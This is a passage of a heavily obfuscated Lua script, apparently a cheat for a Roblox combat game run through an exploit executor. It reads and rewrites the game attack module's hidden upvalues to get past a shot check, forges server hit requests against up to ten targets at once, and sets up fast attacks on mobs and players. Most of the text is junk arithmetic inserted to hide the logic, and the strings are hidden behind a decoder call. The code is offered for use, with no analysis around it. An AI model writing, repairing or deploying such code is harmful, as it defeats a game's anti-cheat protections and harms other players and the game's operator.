end local _q63=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _t33=(97<19) and (19-97) or (97-19);
end local _w139=(function() local _acc=139; local _t={34,38,139}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
end local _m5413=({54,13,17})[1]+0; local _w150=(function() local _acc=150; local _t={41,8,150}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _SGDs5a2n2a()
end
return __1_l
end local _q50=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k41=45+41; if (88*48)%((88+48)==0 and 1 or (88+48))==(88*48)%((88+48)==0 and 1 or (88+48)) then local _z8848=1 end if _k41>1000000 then error(_SDXf6js66qm(56)) end local _q27=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end
print(_SDXf6js66qm(57))
BypassShootGun = function()
local __1_o = pcall(function()
local _0x3d = game:GetService(_SDXf6js66qm(58))
local _Ill_1q = _0x3d and _0x3d:FindFirstChild(_SDXf6js66qm(59))
local _0x3f = _Ill_1q and _Ill_1q:FindFirstChild(_SDXf6js66qm(60))
if not _0x3f then local _q31=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
return
end local _n62=(62%2==0) and 90 or 62; if (98*51)%((98+51)==0 and 1 or (98+51))==(98*51)%((98+51)==0 and 1 or (98+51)) then local _z9851=1 end
local _OOOo_1s = require(_0x3f)
if not _OOOo_1s or not _OOOo_1s.Attack or type(debug) ~= _SDXf6js66qm(61) then
return
end local _q46=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _s44=_SDXf6js66qm(62) for _i=1,0 do local _f61=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); _s44=_s44.._i end end if (10*20)%((10+20)==0 and 1 or (10+20))==(10*20)%((10+20)==0 and 1 or (10+20)) then local _z1020=1 end _SGDs5a2n2a()
if type(debug.getupvalues) ~= _SDXf6js66qm(63) or type(debug.getupvalue) ~= _SDXf6js66qm(64) then
return
end do local _p64={}; for _i=1,1 do _p64[_i]=_i*94 end; local _sum64=0; for _i=1,#_p64 do _sum64=_sum64+_p64[_i] end end local _t4=(17<78) and (78-17) or (17-78);
local __1_t, __1_u = pcall(debug.getupvalues, _OOOo_1s.Attack)
local _0x43 = __1_t and __1_u and __1_u[9]
if not _0x43 then local _q19=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
return
end local _m3422=({34,22,32})[1]+0; local _q12=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
local function __1_w(__1_x)
local _IoOo_1y, __1_z, _OIOo_20 = pcall(debug.getupvalue, _0x43, __1_x)
if not _IoOo_1y then
return nil
end local _q17=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _t6=(14<25) and (25-14) or (14-25); _SGDs5a2n2a()
if _OIOo_20 ~= nil then local _f38=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10);
return _OIOo_20
end local _n48=(48%2==0) and 32 or 48; if (72*37)%((72+37)==0 and 1 or (72+37))==(72*37)%((72+37)==0 and 1 or (72+37)) then local _z7237=1 end
return __1_z
end
local __2_1 = __1_w(14)
local __2_2 = __1_w(16)
local _0x4b = __1_w(12)
local _0x4c = __1_w(18)
if
type(__2_1) ~= _SDXf6js66qm(65)
or type(__2_2) ~= _SDXf6js66qm(66)
or __2_2 <= 0
or type(_0x4b) ~= _SDXf6js66qm(67)
or _0x4c == nil
then local _w87=(function() local _acc=87; local _t={22,47,87}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _n61=(61%2==0) and 42 or 61;
return
end local _w130=(function() local _acc=130; local _t={62,45,130}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local _0x4d = _0x4b * 798405
local _IlOo_26 = (__2_1 * 798405 + _0x4b * 727595) % __2_2
_IlOo_26 = (_IlOo_26 * __2_2 + _0x4d) % 1099511627776
__2_1 = math.floor(_IlOo_26 / __2_2)
_0x4b = _IlOo_26 - __2_1 * __2_2
if type(debug.setupvalue) == _SDXf6js66qm(68) then local _t7=(68<74) and (74-68) or (68-74); do local _p79={}; for _i=1,4 do _p79[_i]=_i*26 end; local _sum79=0; for _i=1,#_p79 do _sum79=_sum79+_p79[_i] end end _SGDs5a2n2a()
pcall(debug.setupvalue, _0x43, 14, __2_1)
pcall(debug.setupvalue, _0x43, 16, __2_2)
pcall(debug.setupvalue, _0x43, 12, _0x4b)
pcall(debug.setupvalue, _0x43, 18, _0x4c)
end
local _llOo_27 = _0x3d:FindFirstChild(_SDXf6js66qm(69))
local __2_8 = _llOo_27 and _llOo_27:FindFirstChild(_SDXf6js66qm(70))
if __2_8 and __2_8:IsA(_SDXf6js66qm(71)) then local _f97=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6); local _m7732=({77,32,51})[1]+0;
pcall(function()
__2_8:FireServer(math.floor(_IlOo_26 / 1099511627776 * 16777215), _0x4c)
end local _w138=(function() local _acc=138; local _t={57,40,138}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); )
end local _t7=(36<10) and (10-36) or (36-10); local _q32=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
end)
return __1_o
end do local _p58={}; for _i=1,3 do _p58[_i]=_i*25 end; local _sum58=0; for _i=1,#_p58 do _sum58=_sum58+_p58[_i] end end do local _k44=97+44; if (96*88)%((96+88)==0 and 1 or (96+88))==(96*88)%((96+88)==0 and 1 or (96+88)) then local _z9688=1 end if _k44>1000000 then error(_SDXf6js66qm(72)) end local _q75=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end _SGDs5a2n2a()
ShootGun = function(_oOoo_29, __2_a)
local _0x53 = localPlayer and localPlayer.Character
local _0x54 = _0x53 and _0x53:FindFirstChildOfClass(_SDXf6js66qm(73))
if not _0x53 or not _0x54 or _0x54.Health <= 0 then do local _p21={}; for _i=1,2 do _p21[_i]=_i*94 end; local _sum21=0; for _i=1,#_p21 do _sum21=_sum21+_p21[_i] end end
return false
end local _j46=(function() local _x=46; local _q45=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _y=69; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then do local _p32={}; for _i=1,1 do _p32[_i]=_i*55 end; local _sum32=0; for _i=1,#_p32 do _sum32=_sum32+_p32[_i] end end _x=_x+1 else _x=_x-1 end; local _q57=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); return _x end)(); if (55*20)%((55+20)==0 and 1 or (55+20))==(55*20)%((55+20)==0 and 1 or (55+20)) then local _z5520=1 end
local _oooo_2d = _oOoo_29
if typeof(_oooo_2d) == _SDXf6js66qm(74) and _oooo_2d:IsA(_SDXf6js66qm(75)) then
_oooo_2d = _oooo_2d.Character
end do local _p50={}; for _i=1,3 do _p50[_i]=_i*88 end; local _sum50=0; for _i=1,#_p50 do _sum50=_sum50+_p50[_i] end end local _m3614=({36,14,5})[1]+0;
local __2_e = getPosition(_oooo_2d)
if not __2_e then local _q59=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
return false
end local _n45=(45%2==0) and 90 or 45; local _w6=(function() local _acc=6; local _t={88,31,6}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); _SGDs5a2n2a()
local _looo_2f
local __2_g
if typeof(_oooo_2d) == _SDXf6js66qm(76) then
if _oooo_2d:IsA(_SDXf6js66qm(77)) then local _q35=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _s50=_SDXf6js66qm(78) for _i=1,0 do if (46*28)%((46+28)==0 and 1 or (46+28))==(46*28)%((46+28)==0 and 1 or (46+28)) then local _z4628=1 end _s50=_s50.._i end end do local _p19={}; for _i=1,4 do _p19[_i]=_i*23 end; local _sum19=0; for _i=1,#_p19 do _sum19=_sum19+_p19[_i] end end
_looo_2f = _oooo_2d
elseif _oooo_2d:IsA(_SDXf6js66qm(79)) then
__2_g = _oooo_2d
local _oIoo_2h = _oooo_2d.Parent
while _oIoo_2h and _oIoo_2h ~= workspace do local _w177=(function() local _acc=177; local _t={32,82,177}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); do local _s53=_SDXf6js66qm(80) for _i=1,0 do local _f51=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); _s53=_s53.._i end end local _w53=(function() local _acc=53; local _t={85,15,53}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
if _oIoo_2h:IsA(_SDXf6js66qm(81)) then
_looo_2f = _oIoo_2h
break
end local _f78=(function(_p) local _s=0; for _i=1,4 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(10); do local _k59=37+59; local _q30=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); if _k59>1000000 then error(_SDXf6js66qm(82)) end if (59*39)%((59+39)==0 and 1 or (59+39))==(59*39)%((59+39)==0 and 1 or (59+39)) then local _z5939=1 end end _SGDs5a2n2a()
_oIoo_2h = _oIoo_2h.Parent
end local _f95=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1);
end local _m9480=({94,80,10})[1]+0; do local _p22={}; for _i=1,3 do _p22[_i]=_i*8 end; local _sum22=0; for _i=1,#_p22 do _sum22=_sum22+_p22[_i] end end
end
if _looo_2f then do local _p82={}; for _i=1,3 do _p82[_i]=_i*95 end; local _sum82=0; for _i=1,#_p82 do _sum82=_sum82+_p82[_i] end end local _n5=(5%2==0) and 47 or 5;
local _0x5a = _looo_2f:FindFirstChildOfClass(_SDXf6js66qm(83))
if _0x5a and _0x5a.Health <= 0 then local _f54=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15);
return false
end do local _f70=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); local _k90=75+90; if _k90>1000000 then if (48*57)%((48+57)==0 and 1 or (48+57))==(48*57)%((48+57)==0 and 1 or (48+57)) then local _z4857=1 end error(_SDXf6js66qm(84)) end end do local _p7={}; for _i=1,4 do _p7[_i]=_i*75 end; local _sum7=0; for _i=1,#_p7 do _sum7=_sum7+_p7[_i] end end _SGDs5a2n2a()
if not __2_g then
local __2_j = _looo_2f:FindFirstChild(_SDXf6js66qm(85))
local _0x5c = _looo_2f:FindFirstChild(_SDXf6js66qm(86))
local _oloo_2l = _looo_2f.PrimaryPart
if __2_j and __2_j:IsA(_SDXf6js66qm(87)) then local _q65=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _m9570=({95,70,31})[1]+0;
__2_g = __2_j
elseif _0x5c and _0x5c:IsA(_SDXf6js66qm(88)) then if (50*3)%((50+3)==0 and 1 or (50+3))==(50*3)%((50+3)==0 and 1 or (50+3)) then local _z503=1 end
__2_g = _0x5c
elseif _oloo_2l and _oloo_2l:IsA(_SDXf6js66qm(89)) then local _m3639=({36,39,32})[1]+0; local _f94=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15);
__2_g = _oloo_2l
end
end local _f9=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); local _n33=(33%2==0) and 31 or 33; _SGDs5a2n2a()
end local _w115=(function() local _acc=115; local _t={3,19,115}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
local _0x5e
for _0x5f, _0x60 in ipairs(_0x53:GetChildren()) do local _m9311=({93,11,23})[1]+0; local _q30=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
if _0x60:IsA(_SDXf6js66qm(90)) and _0x60.ToolTip == _SDXf6js66qm(91) then
_0x5e = _0x60
break
end if (34*31)%((34+31)==0 and 1 or (34+31))==(34*31)%((34+31)==0 and 1 or (34+31)) then local _z3431=1 end do local _k33=94+33; if (16*6)%((16+6)==0 and 1 or (16+6))==(16*6)%((16+6)==0 and 1 or (16+6)) then local _z166=1 end if _k33>1000000 then error(_SDXf6js66qm(92)) end local _w71=(function() local _acc=71; local _t={50,31,71}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end
end do local _p73={}; for _i=1,2 do _p73[_i]=_i*88 end; local _sum73=0; for _i=1,#_p73 do _sum73=_sum73+_p73[_i] end end
if not _0x5e then do local _q87=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _s51=_SDXf6js66qm(93) for _i=1,0 do _s51=_s51.._i end local _w169=(function() local _acc=169; local _t={81,70,169}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end _SGDs5a2n2a()
return false
end local _f77=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6);
local function __2_p(__2_q, __2_r, _OoIo_2s, _ooIo_2t)
if
_OoIo_2s
and typeof(_OoIo_2s) == _SDXf6js66qm(94)
and _OoIo_2s:IsA(_SDXf6js66qm(95))
and not __2_r[_OoIo_2s]
and #__2_q < _ooIo_2t
then local _j60=(function() local _x=60; local _q95=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _y=25; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then if (59*56)%((59+56)==0 and 1 or (59+56))==(59*56)%((59+56)==0 and 1 or (59+56)) then local _z5956=1 end _x=_x+1 else _x=_x-1 end; local _f45=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); return _x end)(); if (15*5)%((15+5)==0 and 1 or (15+5))==(15*5)%((15+5)==0 and 1 or (15+5)) then local _z155=1 end
__2_r[_OoIo_2s] = true
__2_q[#__2_q + 1] = _OoIo_2s
end
end local _q8=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k89=91+89; local _f45=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); if _k89>1000000 then error(_SDXf6js66qm(96)) end local _q33=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end
local _0x66, __2_v = pcall(function()
if _0x5e.Name == _SDXf6js66qm(97) then if (45*52)%((45+52)==0 and 1 or (45+52))==(45*52)%((45+52)==0 and 1 or (45+52)) then local _z4552=1 end
local __2_w = _0x5e:FindFirstChild(_SDXf6js66qm(98))
if not __2_w then local _n18=(18%2==0) and 5 or 18; if (83*27)%((83+27)==0 and 1 or (83+27))==(83*27)%((83+27)==0 and 1 or (83+27)) then local _z8327=1 end _SGDs5a2n2a()
return false
end
__2_w:FireServer(_SDXf6js66qm(99), __2_e)
return true
end local _w8=(function() local _acc=8; local _t={31,48,8}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); do local _s14=_SDXf6js66qm(100) for _i=1,0 do if (55*26)%((55+26)==0 and 1 or (55+26))==(55*26)%((55+26)==0 and 1 or (55+26)) then local _z5526=1 end _s14=_s14.._i end end do local _p65={}; for _i=1,2 do _p65[_i]=_i*69 end; local _sum65=0; for _i=1,#_p65 do _sum65=_sum65+_p65[_i] end end
local _0x69 = game:GetService(_SDXf6js66qm(101))
local _IIIo_2y = _0x69 and _0x69:FindFirstChild(_SDXf6js66qm(102))
local _0x6b = _IIIo_2y and _IIIo_2y:FindFirstChild(_SDXf6js66qm(103))
local __3_0 = _0x6b and _0x6b:FindFirstChild(_SDXf6js66qm(104))
if not __3_0 or not __3_0:IsA(_SDXf6js66qm(105)) then
return false
end if (65*47)%((65+47)==0 and 1 or (65+47))==(65*47)%((65+47)==0 and 1 or (65+47)) then local _z6547=1 end local _j23=(function() local _x=23; local _y=15; local _w190=(function() local _acc=190; local _t={61,55,190}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then _x=_x+1 else _x=_x-1 end local _q76=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); ; return _x end do local _p42={}; for _i=1,3 do _p42[_i]=_i*23 end; local _sum42=0; for _i=1,#_p42 do _sum42=_sum42+_p42[_i] end end )();
pcall(BypassShootGun)
if _0x5e.Name == _SDXf6js66qm(106) then if (31*68)%((31+68)==0 and 1 or (31+68))==(31*68)%((31+68)==0 and 1 or (31+68)) then local _z3168=1 end
pcall(function()
_0x5e.Enabled = true
_0x5e:SetAttribute(_SDXf6js66qm(107), false)
_0x5e:SetAttribute(_SDXf6js66qm(108), 100)
_0x5e:SetAttribute(
_SDXf6js66qm(109),
(_0x5e:GetAttribute(_SDXf6js66qm(110)) or 0) + 1
)
end do if (31*36)%((31+36)==0 and 1 or (31+36))==(31*36)%((31+36)==0 and 1 or (31+36)) then local _z3136=1 end local _k28=66+28; if _k28>1000000 then local _q90=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); error(_SDXf6js66qm(111)) end end local _f89=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); _SGDs5a2n2a() )
local _olIo_31 = {}
local _IlIo_32 = {}
__2_p(_olIo_31, _IlIo_32, __2_g, 10)
local _0x6f = getgenv().Setting and getgenv().Setting.Dragonstorm
if not _0x6f or _0x6f.SpreadDamage ~= false then
for __3_4, _0x71 in ipairs(getHits(120, _SDXf6js66qm(112))) do local _q61=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _j66=(function() local _x=66; local _y=30; local _w92=(function() local _acc=92; local _t={18,74,92}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then _x=_x+1 else _x=_x-1 end local _q99=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); ; return _x end local _w169=(function() local _acc=169; local _t={61,50,169}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); )();
__2_p(_olIo_31, _IlIo_32, _0x71, 10)
if #_olIo_31 >= 10 then if (65*78)%((65+78)==0 and 1 or (65+78))==(65*78)%((65+78)==0 and 1 or (65+78)) then local _z6578=1 end
break
end do do local _p13={}; for _i=1,2 do _p13[_i]=_i*24 end; local _sum13=0; for _i=1,#_p13 do _sum13=_sum13+_p13[_i] end end local _k4=63+4; if _k4>1000000 then if (59*18)%((59+18)==0 and 1 or (59+18))==(59*18)%((59+18)==0 and 1 or (59+18)) then local _z5918=1 end error(_SDXf6js66qm(113)) end end if (83*28)%((83+28)==0 and 1 or (83+28))==(83*28)%((83+28)==0 and 1 or (83+28)) then local _z8328=1 end
end
end local _f9=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); local _m85=({8,5,35})[1]+0; _SGDs5a2n2a()
if #_olIo_31 == 0 then do local _p46={}; for _i=1,3 do _p46[_i]=_i*63 end; local _sum46=0; for _i=1,#_p46 do _sum46=_sum46+_p46[_i] end end
_olIo_31[1] = __2_e
end do do local _p18={}; for _i=1,3 do _p18[_i]=_i*75 end; local _sum18=0; for _i=1,#_p18 do _sum18=_sum18+_p18[_i] end end local _k7=72+7; if _k7>1000000 then if (82*38)%((82+38)==0 and 1 or (82+38))==(82*38)%((82+38)==0 and 1 or (82+38)) then local _z8238=1 end error(_SDXf6js66qm(114)) end end local _q90=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
__3_0:FireServer(__2_e, _olIo_31)
return true
end
if _0x5e.Name == _SDXf6js66qm(115) or _0x5e.Name == _SDXf6js66qm(116) then local _q89=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _s56=_SDXf6js66qm(117) for _i=1,0 do do local _p78={}; for _i=1,3 do _p78[_i]=_i*31 end; local _sum78=0; for _i=1,#_p78 do _sum78=_sum78+_p78[_i] end end _s56=_s56.._i end end local _w146=(function() local _acc=146; local _t={57,41,146}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
__3_0:FireServer(__2_e)
return true
end
local __3_6 = {}
local __3_7 = {}
__2_p(__3_6, __3_7, __2_g, 10)
if not __2_a then local _q33=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); do local _k71=63+71; local _w24=(function() local _acc=24; local _t={19,31,24}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); if _k71>1000000 then error(_SDXf6js66qm(118)) end local _w33=(function() local _acc=33; local _t={3,54,33}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); end _SGDs5a2n2a()
for __3_8, _0x75 in ipairs(getHits(100, _SDXf6js66qm(119))) do if (29*14)%((29+14)==0 and 1 or (29+14))==(29*14)%((29+14)==0 and 1 or (29+14)) then local _z2914=1 end
__2_p(__3_6, __3_7, _0x75, 10)
if #__3_6 >= 10 then local _n86=(86%2==0) and 77 or 86; if (76*7)%((76+7)==0 and 1 or (76+7))==(76*7)%((76+7)==0 and 1 or (76+7)) then local _z767=1 end
break
end
end do local _p46={}; for _i=1,3 do _p46[_i]=_i*5 end; local _sum46=0; for _i=1,#_p46 do _sum46=_sum46+_p46[_i] end end local _j9=(function() local _x=9; local _y=76; do local _p20={}; for _i=1,1 do _p20[_i]=_i*58 end; local _sum20=0; for _i=1,#_p20 do _sum20=_sum20+_p20[_i] end end if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then _x=_x+1 else _x=_x-1 end local _q77=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); ; return _x end local _w114=(function() local _acc=114; local _t={95,65,114}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); )();
end if (10*14)%((10+14)==0 and 1 or (10+14))==(10*14)%((10+14)==0 and 1 or (10+14)) then local _z1014=1 end
if #__3_6 == 0 then local _j92=(function() local _x=92; local _f30=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); local _y=72; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then local _f95=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); _x=_x+1 else _x=_x-1 end; do local _p80={}; for _i=1,1 do _p80[_i]=_i*99 end; local _sum80=0; for _i=1,#_p80 do _sum80=_sum80+_p80[_i] end end return _x end)(); local _f74=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); _SGDs5a2n2a()
__3_6[1] = __2_e
end
__3_0:FireServer(__2_e, __3_6)
return true
end local _q73=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _t37=(96<19) and (19-96) or (96-19); )
if not _0x66 then local _w125=(function() local _acc=125; local _t={63,86,125}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
warn(_SDXf6js66qm(120), __2_v)
return false
end local _j47=(function() local _x=47; local _q21=(function() local _r=0; local _i=1; while _i<=2 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _y=51; if (_x*_x-_y*_y)==((_x-_y)*(_x+_y)) then local _f60=(function(_p) local _s=0; for _i=1,1 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(1); _x=_x+1 else _x=_x-1 end; do local _p36={}; for _i=1,1 do _p36[_i]=_i*22 end; local _sum36=0; for _i=1,#_p36 do _sum36=_sum36+_p36[_i] end end return _x end)(); do local _p39={}; for _i=1,4 do _p39[_i]=_i*83 end; local _sum39=0; for _i=1,#_p39 do _sum39=_sum39+_p39[_i] end end
return __2_v == true
end
StartAttack = tick()
print(_SDXf6js66qm(121))
print(_SDXf6js66qm(122))
local _Iolo_3a = game:GetService(_SDXf6js66qm(123))
local _lolo_3b = game:GetService(_SDXf6js66qm(124))
local _0x78 = game:GetService(_SDXf6js66qm(125))
local __3_d = game:GetService(_SDXf6js66qm(126))
local _IIlo_3e = _Iolo_3a.LocalPlayer
local _lIlo_3f = _0x78:WaitForChild(_SDXf6js66qm(127))
local __3_g = _0x78:WaitForChild(_SDXf6js66qm(128))
local _0x7d = _lolo_3b.Modules.Net
local _Illo_3i = _0x7d[_SDXf6js66qm(129)]
local _0x7f = _0x7d[_SDXf6js66qm(130)]
local _OOOI_3k = nil
local __3_l = nil
for _0x82, _lOOI_3n in
next,
{
_lolo_3b.Util,
_lolo_3b.Common,
_lolo_3b.Remotes,
_lolo_3b.Assets,
_lolo_3b.FX,
},
nil
do do local _p43={}; for _i=1,4 do _p43[_i]=_i*26 end; local _sum43=0; for _i=1,#_p43 do _sum43=_sum43+_p43[_i] end end do local _k4=41+4; if (9*51)%((9+51)==0 and 1 or (9+51))==(9*51)%((9+51)==0 and 1 or (9+51)) then local _z951=1 end if _k4>1000000 then error(_SDXf6js66qm(131)) end if (84*72)%((84+72)==0 and 1 or (84+72))==(84*72)%((84+72)==0 and 1 or (84+72)) then local _z8472=1 end end _SGDs5a2n2a()
local _0x84 = next
local _ooOI_3p, _0x86 = _lOOI_3n:GetChildren()
for _0x87, _0x88 in _0x84, _ooOI_3p, _0x86 do local _q43=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
if _0x88:IsA(_SDXf6js66qm(132)) and _0x88:GetAttribute(_SDXf6js66qm(133)) then do local _f71=(function(_p) local _s=0; for _i=1,2 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(3); local _s22=_SDXf6js66qm(134) for _i=1,0 do _s22=_s22.._i end do local _p14={}; for _i=1,3 do _p14[_i]=_i*36 end; local _sum14=0; for _i=1,#_p14 do _sum14=_sum14+_p14[_i] end end end
_OOOI_3k = _0x88
__3_l = _0x88:GetAttribute(_SDXf6js66qm(135))
end local _f52=(function(_p) local _s=0; for _i=1,3 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(6);
end local _t44=(13<24) and (24-13) or (13-24); local _q29=(function() local _r=0; local _i=1; while _i<=5 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
_lOOI_3n.ChildAdded:Connect(function(_0x89)
if _0x89:IsA(_SDXf6js66qm(136)) and _0x89:GetAttribute(_SDXf6js66qm(137)) then
_OOOI_3k = _0x89
__3_l = _0x89:GetAttribute(_SDXf6js66qm(138))
end if (23*67)%((23+67)==0 and 1 or (23+67))==(23*67)%((23+67)==0 and 1 or (23+67)) then local _z2367=1 end local _m4526=({45,26,12})[1]+0; _SGDs5a2n2a()
end local _q23=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); )
end do local _q92=(function() local _r=0; local _i=1; while _i<=3 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); local _s23=_SDXf6js66qm(139) for _i=1,0 do _s23=_s23.._i end local _q23=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); end
local function _IIOI_3u(__3_v)
local _0x8c = getgenv().Setting and getgenv().Setting.FastAttack
if not _0x8c then local _q15=(function() local _r=0; local _i=1; while _i<=1 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)();
return true
end local _n75=(75%2==0) and 13 or 75; local _w90=(function() local _acc=90; local _t={87,38,90}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
if _0x8c.Enable == false then
return false
end do local _p48={}; for _i=1,1 do _p48[_i]=_i*90 end; local _sum48=0; for _i=1,#_p48 do _sum48=_sum48+_p48[_i] end end do local _k20=5+20; local _q63=(function() local _r=0; local _i=1; while _i<=4 do _r=_r+(_i*_i); _i=_i+1 end; return _r end)(); if _k20>1000000 then error(_SDXf6js66qm(140)) end local _f24=(function(_p) local _s=0; for _i=1,5 do _s=_s+_i end; if _s==_p then return _s end; return _s end)(15); end _SGDs5a2n2a()
if __3_v == _lIlo_3f then local _w5=(function() local _acc=5; local _t={60,20,5}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)();
return _0x8c.OnMob ~= false
end do local _w99=(function() local _acc=99; local _t={94,59,99}; for _i=1,#_t do _acc=(_acc+_t[_i])%2311 end; return _acc end)(); local _s24=_SDXf6js66qm(141) for _i=1,0 do _s24=_s24.._i end do local _p68={}; for _i=1,1 do _p68[_i]=_i*51 end; local _sum68=0; for _i=1,#_p68 do _sum68=_sum68+_p68[_i] end end end
if __3_v == __3_g then if (11*28)%((11+28)==0 and 1 or (11+28))==(11*28)%((11+28)==0 and 1 or (11+28)) then local _z1128=1 end
return _0x8c.OnPlayer ~= false
